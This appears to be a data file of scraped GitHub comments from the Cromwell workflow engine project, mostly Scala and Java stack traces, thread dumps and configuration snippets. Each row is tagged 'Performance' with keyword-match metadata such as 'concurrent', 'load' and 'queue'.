scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99402,concurren,concurrent,99402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"o what they do (e.g., `dockersave`. Some quick learnings:. Let's say we create a defaults section that looks like this, to set some shared environment variables, working directory, docker container, anything we want really:. ```; defaults: &defaults; docker:; - image: docker:18.01.0-ce-git; working_directory: /tmp/src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it to `BASH_ENV` and sourcing that, which needs to be done in each step separately (e.g., a ""run"" section); - most of the weird if statement logic is just to test if the user (you) has defined an environment variable (somewhere) and if not, go to default or just skip a step.; - the easiest way to ""read"" the file is to go to the bottom and start at ""workflows"" that describe the highest level of things, e.g. ""run all these steps under build, and trigger based on these filters and branches."" TLDR **workflows** define a dependency graph sort of deal.; - The details for the steps for each workflow are under ""jobs"" that are the seconds above that, so the names of jobs are going to correspond to workflows. In ""jobs"" you can then trace back up to find the corresponding step. TLDR **jobs** are all the steps of stuff to do.; - Steps that aren't found (e.g., ch",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:2017,load,load,2017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,3,"['cache', 'load']","['cache', 'load']"
Performance,"oExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3931,concurren,concurrent,3931,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,"ob/33c58ef22b6a8edc4c1912c1416225c79d298f76/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala; which was tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1230,concurren,concurrent,1230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"ockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2901,concurren,concurrent,2901,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"ockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(Thre",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2024,concurren,concurrent,2024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"oinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQue",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4441,concurren,concurrent,4441,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"oint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc; ```. Maybe this could be the default value in the [reference configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:1335,concurren,concurrent-job-limit,1335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['concurren'],['concurrent-job-limit']
Performance,"oke this also not fixing the cpu load, I'm trying t debug this but can't see where the load comes from. Maybe the calander call?. Right now I'm trying to create a extra poll queue just for isAlive. Altough with the the status is not passed anymore to the normal polling. I think this is because the handle stays in memory till the jobActor is finished, starting a new queue mean a copy of the handle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-428546278:33,load,load,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-428546278,4,"['load', 'queue']","['load', 'queue']"
Performance,"ollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.aroundReceive(JesPollingActor.scala:22); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-28 14:37:35,25] [error] The JES polling actor Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$a#551868791] unexpectedly terminated while conducting 5 polls. Making a new one...; [2016-10-28 14:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:4479,concurren,concurrent,4479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,olveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateI,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4187,concurren,concurrent,4187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
Performance,"oncurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (pa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3897,concurren,concurrent,3897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"onditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143);",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5082,concurren,concurrent,5082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,or.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2715,concurren,concurrent,2715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['concurren'],['concurrent']
